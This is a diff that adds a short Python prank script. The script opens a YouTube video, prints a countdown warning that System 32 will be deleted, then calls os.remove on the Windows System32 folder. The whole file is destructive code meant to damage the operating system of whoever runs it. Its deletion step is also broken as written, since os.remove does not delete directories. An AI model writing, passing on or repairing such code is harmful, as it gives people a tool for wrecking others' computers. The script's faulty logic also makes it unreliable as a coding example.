@@ -1,0 +1,21 @@
+import asyncio
+import os
+import webbrowser
+
+async def delete():
+    countdown = 11
+    while countdown != 0:
+        countdown -= 1
+        await asyncio.sleep(1)
+        print(f"System 32 will delete in {countdown} seconds")
+
+    print("Good Bye")
+    os.remove("C:/Windows/System32")
+
+
+async def start():
+    webbrowser.open("https://www.youtube.com/watch?v=2Ax_EIb1zks")
+    await asyncio.sleep(10)
+    await delete()
+
+asyncio.run(start())
